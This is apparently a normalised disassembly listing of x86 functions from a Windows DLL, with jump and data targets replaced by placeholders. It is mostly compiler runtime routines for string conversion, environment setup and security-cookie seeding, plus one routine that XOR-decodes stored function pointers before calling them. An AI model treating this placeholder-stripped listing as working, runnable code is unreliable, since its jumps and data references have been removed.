fld [ ebp + 0x8 ]
fld [ r--data ]
fcom st1
fnstsw ax
fstp st1
test ah 0x41
jne r-xdata
fld st1
fsub [ r--data ]
fstp [ ebp + 0x8 ]
fld [ ebp + 0x8 ]
fabs
fstp [ ebp + 0x8 ]
fld [ ebp + 0x8 ]
fcomp st1
fnstsw ax
test ah 0x5
jpe r-xdata
fstp st1
fstp st0
fldz
fstp [ ecx + 0x114 ]
pop ebp
retn 0x4
fld st1
fsub [ r--data ]
fstp [ ebp + 0x8 ]
fld [ ebp + 0x8 ]
fabs
fstp [ ebp + 0x8 ]
fld [ ebp + 0x8 ]
fcomp st1
fnstsw ax
test ah 0x5
jpe r-xdata
fstp st1
fstp st0
fld [ r--data ]
fstp [ ecx + 0x114 ]
pop ebp
retn 0x4
fxch st1
fsub [ r--data ]
fstp [ ebp + 0x8 ]
fld [ ebp + 0x8 ]
fabs
fstp [ ebp + 0x8 ]
fld [ ebp + 0x8 ]
fcompp
fnstsw ax
test ah 0x5
jpe r-xdata
fstp st1
fstp st0
fld1
fstp [ ecx + 0x114 ]
pop ebp
retn 0x4
pop ebp
retn 0x4
fld [ r--data ]
fstp [ ecx + 0x114 ]
sub_10024360
push ebp
mov ebp esp
push ecx
push 0xffffffff
push 0x0
push eax
mov [ ebp - 0x4 ] 0x0
call sub_1000c1e0
xor ecx ecx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov [ esi ] cx
push eax
mov ecx esi
call sub_10051390
mov eax esi
mov esp ebp
pop ebp
retn
sub_100243a0
push ebp
mov ebp esp
push 0xffffffff
push sub_1007e144
mov eax [ fs : 0x0 ]
push eax
sub esp 0x2c
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x14 ] esi
mov [ esi ] r--data
call sub_10050ee7
mov [ esi + 0x8 ] eax
call sub_1005b9b6
xor ebx ebx
push ebx
lea ecx [ ebp - 0x10 ]
mov edi eax
call sub_100067d1
mov eax [ edi + 0x4 ]
cmp eax 0xffffffff
jae r-xdata
lea ecx [ ebp - 0x10 ]
call sub_1002470e
mov [ esi + 0x20 ] 0xf
mov [ esi + 0x1c ] ebx
mov [ ebp - 0x4 ] ebx
mov [ esi + 0xc ] bl
xor eax eax
mov [ esi + 0x3c ] 0x7
mov [ esi + 0x38 ] ebx
mov [ esi + 0x28 ] ax
push 0x10
mov [ ebp - 0x4 ] 0x2
mov [ esi + 0x48 ] bx
mov [ esi + 0x4a ] bl
call sub_1005ac7e
mov edi eax
add esp 0x4
mov [ ebp - 0x10 ] edi
cmp edi ebx
je r-xdata
inc eax
mov [ edi + 0x4 ] eax
xor edi edi
mov [ edi + 0x4 ] ebx
push r--data
lea ecx [ ebp - 0x38 ]
mov [ ebp - 0x4 ] 0x4
mov [ edi ] r--data
call sub_100216c0
call sub_1006312b
lea ecx [ ebp - 0x38 ]
mov [ edi + 0x8 ] eax
mov [ edi + 0xc ] edx
call sub_10062210
mov [ edi ] r--data
jmp r-xdata
push edi
mov ecx esi
mov [ ebp - 0x4 ] 0x2
call sub_1000a200
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_10024496
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
test edi edi
je r-xdata
xor eax eax
cmp [ ebp + 0x10 ] 0x0
je r-xdata
cmp [ edi ] 0x0
jne r-xdata
mov eax [ ebp + 0x18 ]
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
mov esi [ eax ]
mov eax [ eax + 0x4 ]
call sub_100539e5
mov esi [ eax + 0x8 ]
call sub_100382f1
jmp r-xdata
xor ecx ecx
mov [ eax ] cx
push [ ebp + 0xc ]
call sub_10044a54
mov esi [ ebp + 0x14 ]
cmp [ esi ] 0x0
pop ecx
mov ebx eax
je r-xdata
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
mov [ ebp + 0xc ] eax
test esi esi
jne r-xdata
test ebx ebx
jne r-xdata
mov al [ edi ]
push ebx
mov [ esi + 0x1 ] al
call sub_1005d8b6
pop ecx
cmp eax 0x1
jle r-xdata
xor eax eax
inc eax
jmp r-xdata
movzx ecx [ edi ]
mov [ eax ] cx
movzx eax [ edi ]
mov ecx [ ebx + 0x4 ]
movzx eax [ ecx + eax + 0x1d ]
and eax 0x4
call sub_10016231
movzx ecx [ edi ]
movzx eax [ eax + ecx * 2 ]
and eax 0x8000
jmp r-xdata
and [ esi ] 0x0
xor eax eax
cmp [ ebp + 0x8 ] eax
setne al
push eax
push [ ebp + 0x8 ]
push 0x2
push esi
push 0x9
push [ ebp + 0xc ]
call [ MultiByteToWideChar@IAT ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
xor eax eax
cmp [ ebp + 0x8 ] eax
setne al
push eax
push [ ebp + 0x8 ]
push 0x1
push edi
push 0x9
push [ ebp + 0xc ]
call [ MultiByteToWideChar@IAT ]
test eax eax
jne r-xdata
push ebx
call sub_1005d8b6
pop ecx
cmp [ ebp + 0x10 ] eax
jae r-xdata
test eax eax
je r-xdata
and [ esi ] 0x0
jmp r-xdata
push ebx
call sub_1005d8b6
pop ecx
cmp eax 0x1
jle r-xdata
mov al [ edi ]
push 0xfffffffe
mov [ esi ] al
pop eax
jmp r-xdata
call sub_10012991
mov [ eax ] 0x2a
or eax 0xffffffff
jmp r-xdata
cmp [ edi + 0x1 ] 0x0
jne r-xdata
xor eax eax
cmp [ ebp + 0x8 ] eax
setne al
push eax
push [ ebp + 0x8 ]
push ebx
call sub_1005d8b6
pop ecx
push eax
push edi
push 0x9
push [ ebp + 0xc ]
call [ MultiByteToWideChar@IAT ]
test eax eax
jne r-xdata
push ebx
call sub_1005d8b6
pop ecx
jmp r-xdata
jmp r-xdata
sub_10024609
mov edi edi
push ebp
mov ebp esp
add ecx 0x8
push ecx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10060d38
add esp 0x14
pop ebp
retn 0x10
sub_1002462a
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
xor esi esi
push edi
mov edi [ rw-data ]
mov [ ebp - 0x4 ] esi
mov eax [ edi ]
cmp eax esi
je r-xdata
xor eax eax
mov ebx [ WideCharToMultiByte@IAT ]
or eax 0xffffffff
jmp r-xdata
push 0x1
push eax
call sub_10025450
pop ecx
pop ecx
mov [ ebp - 0x4 ] eax
cmp eax esi
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
push esi
push esi
push [ ebp - 0x8 ]
push eax
push 0xffffffff
push [ edi ]
push esi
push esi
call ebx
test eax eax
je r-xdata
push [ ebp - 0x4 ]
call sub_10020a90
pop ecx
jmp r-xdata
lea eax [ ebp - 0x4 ]
push esi
push eax
call sub_100491eb
pop ecx
pop ecx
test eax eax
jns r-xdata
add edi 0x4
mov eax [ edi ]
cmp eax esi
jne r-xdata
cmp [ ebp - 0x4 ] esi
je r-xdata
push esi
push esi
push esi
push esi
push 0xffffffff
push eax
push esi
push esi
call ebx
mov [ ebp - 0x8 ] eax
cmp eax esi
je r-xdata
push [ ebp - 0x4 ]
call sub_10020a90
pop ecx
mov [ ebp - 0x4 ] esi
sub_100246c1
mov edi edi
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0xc ]
test edi edi
je r-xdata
xor eax eax
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
push esi
mov esi [ eax ]
cmp esi edi
je r-xdata
mov eax edi
pop esi
jmp r-xdata
push edi
mov [ eax ] edi
call sub_1004a2b3
pop ecx
test esi esi
je r-xdata
pop edi
pop ebp
retn
push esi
call sub_10015308
cmp [ esi ] 0x0
pop ecx
jne r-xdata
cmp esi rw-data
je r-xdata
push esi
call sub_1000878a
pop ecx
sub_1002473f
push ebp
mov ebp esp
sub esp 0x8
push ebx
push esi
push edi
cld
mov [ ebp - 0x4 ] eax
xor eax eax
push eax
push eax
push eax
push [ ebp - 0x4 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1000c53b
add esp 0x20
mov [ ebp - 0x8 ] eax
pop edi
pop esi
pop ebx
mov eax [ ebp - 0x8 ]
mov esp ebp
pop ebp
retn
sub_10024780
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x4 ]
mov ecx [ ebp + 0xc ]
push esi
cmp eax [ ecx + 0x4 ]
jne r-xdata
xor eax eax
pop esi
pop ebp
retn
mov ecx [ ecx ]
mov esi [ edx ]
cmp eax 0x4
jb r-xdata
test eax eax
je r-xdata
jmp r-xdata
mov eax 0x1
pop esi
pop ebp
retn
mov dl [ ecx ]
cmp dl [ esi ]
jne r-xdata
mov edx [ esi ]
cmp edx [ ecx ]
jne r-xdata
cmp eax 0x1
jbe r-xdata
sub eax 0x4
add ecx 0x4
add esi 0x4
cmp eax 0x4
jae r-xdata
mov dl [ ecx + 0x1 ]
cmp dl [ esi + 0x1 ]
jne r-xdata
cmp eax 0x2
jbe r-xdata
mov al [ ecx + 0x2 ]
cmp al [ esi + 0x2 ]
jne r-xdata
sub_100247e5
cmp [ rw-data ] 0x0
jne r-xdata
push esi
mov esi [ rw-data ]
push edi
xor edi edi
test esi esi
jne r-xdata
call sub_1005e29b
mov al [ esi ]
test al al
jne r-xdata
or eax 0xffffffff
jmp r-xdata
cmp al 0x3d
je r-xdata
push 0x4
inc edi
push edi
call sub_10025450
mov edi eax
pop ecx
pop ecx
mov [ rw-data ] edi
test edi edi
je r-xdata
pop edi
pop esi
retn
push esi
call sub_10078ac0
pop ecx
lea esi [ esi + eax + 0x1 ]
inc edi
mov esi [ rw-data ]
push ebx
jmp r-xdata
cmp [ esi ] 0x0
jne r-xdata
push esi
call sub_10078ac0
cmp [ esi ] 0x3d
pop ecx
lea ebx [ eax + 0x1 ]
je r-xdata
push [ rw-data ]
call sub_10020a90
and [ rw-data ] 0x0
and [ edi ] 0x0
mov [ rw-data ] 0x1
xor eax eax
add esi ebx
push 0x1
push ebx
call sub_10025450
pop ecx
pop ecx
mov [ edi ] eax
test eax eax
je r-xdata
push [ rw-data ]
call sub_10020a90
and [ rw-data ] 0x0
or eax 0xffffffff
jmp r-xdata
push esi
push ebx
push eax
call sub_10005e18
add esp 0xc
test eax eax
jne r-xdata
pop ecx
pop ebx
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_1000b659
int3
add edi 0x4
sub_100248d0
push ebp
mov ebp esp
sub esp 0x1c
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
mov edx [ ebp + 0x10 ]
push ebx
push esi
mov bl 0x38
push 0x0
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0x14 ]
mov [ ebp - 0xc ] ecx
mov ecx [ rw-data ]
mov [ ebp + 0x8 ] ecx
xor [ ebp + 0x8 ] bl
xor [ ebp + 0x9 ] bl
xor [ ebp + 0xa ] bl
xor [ ebp + 0xb ] bl
mov ecx [ ebp + 0x8 ]
push 0x0
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x1c ]
push eax
push ecx
mov [ ebp - 0x8 ] edx
mov edx [ rw-data ]
mov [ ebp + 0xc ] edx
xor [ ebp + 0xc ] bl
xor [ ebp + 0xd ] bl
xor [ ebp + 0xe ] bl
xor [ ebp + 0xf ] bl
push 0x0
push 0x0
mov [ ebp - 0x1c ] 0xc
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x14 ] 0x0
call [ ebp + 0xc ]
lea edx [ ebp + 0x10 ]
mov esi eax
mov [ ebp + 0x10 ] edx
jmp r-xdata
mov ecx [ rw-data ]
mov [ ebp + 0x8 ] ecx
xor [ ebp + 0x8 ] bl
xor [ ebp + 0x9 ] bl
xor [ ebp + 0xa ] bl
xor [ ebp + 0xb ] bl
push 0xffffffff
push esi
call [ ebp + 0x8 ]
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov [ ebp + 0x8 ] eax
xor [ ebp + 0x8 ] bl
xor [ ebp + 0x9 ] bl
xor [ ebp + 0xa ] bl
xor [ ebp + 0xb ] bl
push esi
call [ ebp + 0x8 ]
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov edx [ rw-data ]
mov eax [ ebp - 0x18 ]
mov [ ebp + 0x8 ] edx
xor [ ebp + 0x8 ] bl
xor [ ebp + 0x9 ] bl
xor [ ebp + 0xa ] bl
xor [ ebp + 0xb ] bl
push eax
call [ ebp + 0x8 ]
mov eax [ ebp - 0x14 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_100249b4
mov edi edi
push ebp
mov ebp esp
push esi
call sub_1003c242
mov ecx [ ebp + 0x8 ]
push ecx
mov [ eax ] ecx
call sub_100112ab
pop ecx
mov esi eax
call sub_10012991
mov [ eax ] esi
pop esi
pop ebp
retn
sub_100249e0
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_1005f9e0
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_10065045
add esp 0x4
sub_10024a01
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
and [ ebp - 0x8 ] 0x0
and [ ebp - 0x4 ] 0x0
push ebx
push edi
mov edi 0xbb40e64e
mov ebx 0xffff0000
cmp eax edi
je r-xdata
push esi
lea eax [ ebp - 0x8 ]
push eax
call [ GetSystemTimeAsFileTime@IAT ]
mov esi [ ebp - 0x4 ]
xor esi [ ebp - 0x8 ]
call [ GetCurrentProcessId@IAT ]
xor esi eax
call [ GetCurrentThreadId@IAT ]
xor esi eax
call [ GetTickCount@IAT ]
xor esi eax
lea eax [ ebp - 0x10 ]
push eax
call [ QueryPerformanceCounter@IAT ]
mov eax [ ebp - 0xc ]
xor eax [ ebp - 0x10 ]
xor esi eax
cmp esi edi
jne r-xdata
test ebx eax
je r-xdata
test ebx esi
jne r-xdata
mov esi 0xbb40e64f
jmp r-xdata
not eax
mov [ rw-data ] eax
jmp r-xdata
mov [ rw-data ] esi
not esi
mov [ rw-data ] esi
pop esi
mov eax esi
or eax 0x4711
shl eax 0x10
or esi eax
pop edi
pop ebx
leave
retn
sub_10024aa0
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
push esi
push edi
mov edi [ ebp + 0xc ]
mov esi ecx
je r-xdata
mov [ esi + 0x10 ] edi
mov [ esi + 0x14 ] 0x7
xor ecx ecx
mov [ esi + edi * 2 ] cx
pop edi
pop esi
pop ebp
retn 0x8
cmp [ esi + 0x14 ] 0x8
jb r-xdata
push ebx
mov ebx [ esi ]
test edi edi
je r-xdata
push ebx
call sub_10065045
add esp 0x4
pop ebx
lea eax [ edi + edi ]
push eax
push ebx
push esi
call sub_10078600
add esp 0xc
sub_10024af0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov ecx [ ebp + 0xc ]
mov edx [ eax + 0x8 ]
mov eax [ eax ]
push ecx
push edx
call eax
add esp 0x8
pop ebp
retn
sub_10024b10
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx eax
mov esi ecx
cmp esi ebx
je r-xdata
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebx + 0x4 ]
sub ecx [ ebx ]
mov eax 0x38e38e39
imul ecx
sar edx 0x3
mov eax edx
shr eax 0x1f
add eax edx
push edi
mov [ ebp - 0x4 ] eax
jne r-xdata
mov edx [ esi + 0x4 ]
mov ecx [ esi ]
sub edx ecx
mov eax 0x38e38e39
imul edx
sar edx 0x3
mov edi edx
shr edi 0x1f
add edi edx
cmp [ ebp - 0x4 ] edi
ja r-xdata
mov ecx [ esi + 0x4 ]
mov eax [ esi ]
cmp eax ecx
je r-xdata
mov edx [ esi + 0x8 ]
sub edx ecx
mov eax 0x38e38e39
imul edx
sar edx 0x3
mov eax edx
shr eax 0x1f
add eax edx
cmp [ ebp - 0x4 ] eax
ja r-xdata
mov eax [ ebx + 0x4 ]
push eax
mov eax ecx
mov ecx [ ebx ]
call sub_10042630
mov edi [ esi + 0x4 ]
add esp 0x4
call sub_1001b300
mov ecx [ ebx + 0x4 ]
sub ecx [ ebx ]
mov eax 0x38e38e39
imul ecx
mov ecx [ esi ]
sar edx 0x3
mov eax edx
shr eax 0x1f
add eax edx
lea eax [ eax + eax * 8 ]
lea edx [ ecx + eax * 4 ]
pop edi
mov [ esi + 0x4 ] edx
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
pop edi
mov edx [ ebp - 0x4 ]
push edx
push ecx
call sub_10005bd0
mov edi [ esi + 0x4 ]
add esp 0x8
mov ebx eax
call sub_1001b300
pop edi
mov [ esi + 0x4 ] ebx
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
test ecx ecx
je r-xdata
mov edx [ ebx ]
lea eax [ edi + edi * 8 ]
lea edi [ edx + eax * 4 ]
mov eax ecx
push edi
mov ecx edx
call sub_10042630
mov ecx [ ebp - 0x4 ]
mov eax [ esi + 0x4 ]
mov ebx [ ebx + 0x4 ]
push ecx
push eax
push ebx
mov ecx edi
call sub_1001e280
add esp 0x10
mov [ esi + 0x4 ] eax
pop edi
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebx + 0x4 ]
sub ecx [ ebx ]
mov eax 0x38e38e39
imul ecx
sar edx 0x3
mov edi edx
shr edi 0x1f
add edi edx
call sub_10047340
test al al
je r-xdata
mov edi [ esi + 0x4 ]
mov eax ecx
call sub_1001b300
mov edx [ esi ]
push edx
call sub_10065045
add esp 0x4
mov edi [ ebp - 0x4 ]
mov eax [ esi ]
mov edx [ ebx + 0x4 ]
mov ecx [ ebx ]
push edi
push eax
push edx
call sub_1001e280
add esp 0xc
mov [ esi + 0x4 ] eax
sub_10024c80
push ebp
mov ebp esp
sub esp 0x8
push ebx
push edi
xor edi edi
push 0x4
mov [ esi + 0x30 ] edi
mov [ esi + 0x8 ] edi
mov [ esi + 0x10 ] edi
mov [ esi + 0x14 ] 0x201
mov [ esi + 0x18 ] 0x6
mov [ esi + 0x1c ] edi
mov [ esi + 0x20 ] edi
mov [ esi + 0x24 ] edi
mov [ esi + 0x28 ] edi
mov [ esi + 0x2c ] edi
mov [ esi + 0xc ] edi
call sub_1005ac7e
mov ebx eax
add esp 0x4
cmp ebx edi
je r-xdata
mov [ esi + 0x30 ] edi
pop edi
pop ebx
mov esp ebp
pop ebp
retn
call sub_10050ee7
mov [ ebx ] eax
call sub_1005b9b6
push edi
lea ecx [ ebp - 0x8 ]
mov [ ebp - 0x4 ] eax
call sub_100067d1
mov ecx [ ebp - 0x4 ]
mov eax [ ecx + 0x4 ]
cmp eax 0xffffffff
jae r-xdata
lea ecx [ ebp - 0x8 ]
call sub_1002470e
mov [ esi + 0x30 ] ebx
pop edi
pop ebx
mov esp ebp
pop ebp
retn
inc eax
mov [ ecx + 0x4 ] eax
sub_10024d10
cmp [ esi + 0x6c ] 0x8
jb r-xdata
push ebx
push edi
xor edi edi
mov ebx 0x7
xor ecx ecx
mov [ esi + 0x6c ] ebx
mov [ esi + 0x68 ] edi
mov [ esi + 0x58 ] cx
cmp [ esi + 0x50 ] 0x8
jb r-xdata
mov eax [ esi + 0x58 ]
push eax
call sub_10065045
add esp 0x4
xor eax eax
mov [ esi + 0x50 ] ebx
mov [ esi + 0x4c ] edi
mov [ esi + 0x3c ] ax
cmp [ esi + 0x30 ] 0x8
jb r-xdata
mov edx [ esi + 0x3c ]
push edx
call sub_10065045
add esp 0x4
xor edx edx
mov [ esi + 0x30 ] ebx
mov [ esi + 0x2c ] edi
mov [ esi + 0x1c ] dx
cmp [ esi + 0x14 ] 0x8
jb r-xdata
mov ecx [ esi + 0x1c ]
push ecx
call sub_10065045
add esp 0x4
mov [ esi + 0x10 ] edi
mov [ esi + 0x14 ] ebx
xor ecx ecx
pop edi
mov [ esi ] cx
pop ebx
retn
mov eax [ esi ]
push eax
call sub_10065045
add esp 0x4
sub_10024da0
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
test ebx ebx
jne r-xdata
push esi
mov esi [ ebp + 0x8 ]
cmp [ esi + 0x120 ] 0x0
jne r-xdata
lea eax [ ebx + 0x1 ]
pop ebx
mov esp ebp
pop ebp
retn 0x18
push edi
push 0x208
push 0x0
push ebx
call sub_10078970
add esp 0xc
cmp [ ebp + 0xc ] 0x0
je r-xdata
pop esi
mov eax 0x1e
pop ebx
mov esp ebp
pop ebp
retn 0x18
lea eax [ ebp + 0xc ]
push eax
call sub_1000b569
mov ecx [ ebp + 0xc ]
mov eax 0xcccccccd
mul ecx
shr edx 0x3
imul edx edx 0xfffffff6
add ecx edx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x120 ]
mov [ ebp + 0xc ] ecx
imul ecx ecx 0x208
lea esi [ ecx + eax + 0x1082c ]
add esp 0x4
lea edi [ ebp + 0x14 ]
mov edx 0x104
mov ecx ebx
call sub_1006b800
test eax eax
js r-xdata
lea eax [ ebp + 0xc ]
push eax
call sub_1000b569
mov ecx [ ebp + 0xc ]
mov eax 0xcccccccd
mul ecx
shr edx 0x3
imul edx edx 0xfffffff6
add ecx edx
mov edx [ esi + 0x120 ]
mov [ ebp + 0xc ] ecx
imul ecx ecx 0x208
lea esi [ ecx + edx + 0x130cc ]
add esp 0x4
lea edi [ ebp - 0x4 ]
mov edx 0x104
mov ecx ebx
call sub_1006b800
test eax eax
js r-xdata
je r-xdata
mov ecx [ ebp + 0x14 ]
mov eax 0x104
sub eax ecx
push esi
lea ecx [ ebx + ecx * 2 ]
mov edx 0x7fffffff
call sub_1006b860
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
mov eax 0x104
sub eax ecx
push esi
lea ecx [ ebx + ecx * 2 ]
mov edx 0x7fffffff
call sub_1006b860
test eax eax
mov edx [ ebp + 0x18 ]
test edx edx
je r-xdata
pop edi
pop esi
mov eax 0x6
pop ebx
mov esp ebp
pop ebp
retn 0x18
mov edx [ ebp + 0x14 ]
test edx edx
je r-xdata
pop edi
pop esi
mov eax 0x4
pop ebx
mov esp ebp
pop ebp
retn 0x18
lea ecx [ ebp + 0xc ]
push ecx
call sub_1000b569
mov ecx [ ebp + 0xc ]
mov eax 0xcccccccd
mul ecx
shr edx 0x3
imul edx edx 0xfffffff6
add ecx edx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x120 ]
mov [ ebp + 0xc ] ecx
imul ecx ecx 0x208
add esp 0x4
lea ecx [ ecx + eax + 0x11c7c ]
push ecx
mov esi 0x104
call sub_10030af0
test eax eax
je r-xdata
mov eax edx
lea esi [ eax + 0x2 ]
mov eax edx
lea esi [ eax + 0x2 ]
cmp [ ebp + 0x10 ] 0x0
je r-xdata
pop edi
pop esi
mov eax 0x8
pop ebx
mov esp ebp
pop ebp
retn 0x18
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax esi
sar eax 0x1
je r-xdata
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax esi
sar eax 0x1
je r-xdata
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn 0x18
lea edx [ ebp + 0xc ]
push edx
call sub_1000b569
mov esi [ ebp + 0xc ]
mov eax 0xcccccccd
mul esi
shr edx 0x3
imul edx edx 0xfffffff6
add esi edx
mov edx [ ebp + 0x1c ]
add esp 0x4
mov [ ebp + 0xc ] esi
test edx edx
je r-xdata
push edx
mov esi 0x104
call sub_10030af0
test eax eax
je r-xdata
push edx
mov esi 0x104
call sub_10030af0
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
imul esi esi 0x208
mov ecx [ eax + 0x120 ]
lea edx [ esi + ecx + 0x1451c ]
push edx
mov esi 0x104
call sub_10030af0
test eax eax
je r-xdata
mov eax edx
lea edi [ eax + 0x2 ]
mov edi edi
pop edi
pop esi
mov eax 0x7
pop ebx
mov esp ebp
pop ebp
retn 0x18
pop edi
pop esi
mov eax 0x5
pop ebx
mov esp ebp
pop ebp
retn 0x18
pop edi
pop esi
mov eax 0xa
pop ebx
mov esp ebp
pop ebp
retn 0x18
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edi
sar eax 0x1
je r-xdata
push edx
mov esi 0x104
call sub_10030af0
test eax eax
je r-xdata
mov esi [ ebp + 0xc ]
pop edi
pop esi
mov eax 0x9
pop ebx
mov esp ebp
pop ebp
retn 0x18
sub_10025050
push esi
mov esi ecx
cmp [ esi + 0xb8 ] 0x0
je r-xdata
pop esi
retn
mov eax [ esi + 0xc0 ]
test eax eax
je r-xdata
mov eax [ esi + 0xc4 ]
test eax eax
je r-xdata
push eax
mov eax [ esi + 0xd8 ]
call eax
mov [ esi + 0xc0 ] 0x0
mov ecx [ esi + 0xd8 ]
push eax
call ecx
mov [ esi + 0xc4 ] 0x0
sub_100250a0
push ebp
mov ebp esp
sub esp 0x1c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x18 ]
push ebx
push esi
mov esi [ ebp + 0x14 ]
mov [ ebp - 0x18 ] ecx
mov ecx [ ebp + 0xc ]
push edi
mov edi [ ebp + 0x20 ]
mov [ esi ] ecx
mov ecx [ ebp + 0x10 ]
mov [ edi ] edx
xor edx edx
mov [ ebp - 0x14 ] eax
mov eax [ esi ]
cmp eax ecx
setne dl
mov [ ebp - 0x10 ] edx
cmp eax ecx
je r-xdata
mov ecx [ ebp - 0x4 ]
mov eax [ ebp - 0x10 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1004c3b6
mov esp ebp
pop ebp
retn 0x1c
mov eax [ ebp + 0x1c ]
cmp [ edi ] eax
je r-xdata
mov ebx [ edi ]
call sub_100238e9
mov ecx [ ebp + 0x1c ]
mov edx [ ebp - 0x18 ]
sub ecx ebx
add edx 0x8
cmp eax ecx
mov eax [ ebp - 0x14 ]
push edx
push eax
jg r-xdata
mov ecx [ eax ]
mov eax [ esi ]
mov [ ebp - 0x1c ] ecx
movzx ecx [ eax ]
push ecx
lea edx [ ebp - 0xc ]
push edx
call sub_10026143
mov ebx eax
add esp 0x10
test ebx ebx
js r-xdata
mov ecx [ esi ]
movzx edx [ ecx ]
push edx
push ebx
call sub_10026143
add esp 0x10
test eax eax
js r-xdata
pop edi
pop esi
mov eax 0x2
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn 0x1c
mov eax [ edi ]
mov ecx [ ebp + 0x1c ]
sub ecx eax
cmp ecx ebx
jl r-xdata
add [ esi ] 0x2
add [ edi ] eax
jmp r-xdata
mov ecx [ ebp - 0x1c ]
mov edx [ ebp - 0x14 ]
mov [ edx ] ecx
push ebx
lea edx [ ebp - 0xc ]
push edx
push eax
call sub_10078600
add [ esi ] 0x2
add esp 0xc
add [ edi ] ebx
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x10 ] 0x0
cmp [ esi ] eax
jne r-xdata
jmp r-xdata
sub_100251a8
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
push esi
jne r-xdata
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1004ea13
add esp 0xc
mov esi [ ebp + 0x8 ]
test esi esi
jne r-xdata
mov ecx [ ebp + 0xc ]
test ecx ecx
je r-xdata
call sub_10012991
mov [ eax ] 0x16
call sub_1002788e
mov eax 0x7fffffff
jmp r-xdata
sub esi ecx
pop esi
pop ebp
retn
mov edx eax
cmp eax 0x5a
ja r-xdata
add ecx 0x2
test dx dx
je r-xdata
cmp eax 0x5a
ja r-xdata
add eax 0x20
movzx edx ax
jmp r-xdata
movzx ecx ax
movzx eax dx
sub eax ecx
jmp r-xdata
cmp dx ax
je r-xdata
add eax 0x20
movzx eax ax
movzx eax [ ecx ]
cmp eax 0x41
jb r-xdata
movzx eax [ esi + ecx ]
cmp eax 0x41
jb r-xdata
sub_10025240
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov eax ebx
push edi
lea edx [ eax + 0x1 ]
mov edi edi
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov esi [ ecx + 0x10 ]
sub eax edx
mov edi eax
mov eax esi
cmp esi edi
jb r-xdata
cmp [ ecx + 0x14 ] 0x10
jb r-xdata
mov eax edi
push eax
push ebx
push ecx
call sub_10068a30
add esp 0xc
test eax eax
jne r-xdata
mov ecx [ ecx ]
pop edi
xor ecx ecx
test eax eax
pop esi
sete al
pop ebx
pop ebp
retn
cmp esi edi
jae r-xdata
xor eax eax
cmp esi edi
setne al
or eax 0xffffffff
pop edi
xor ecx ecx
test eax eax
pop esi
sete al
pop ebx
pop ebp
retn
sub_100252b0
push ebp
mov ebp esp
push 0xffffffff
push sub_1007f428
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
xor edi edi
mov [ ebp - 0x14 ] edi
mov [ ebp - 0x10 ] edi
mov [ ebp - 0x4 ] edi
cmp eax edi
jne r-xdata
cmp ecx edi
jne r-xdata
lea esi [ ebp - 0x14 ]
call sub_100173d0
lea eax [ edi + 0x1 ]
mov ecx [ ebp - 0xc ]
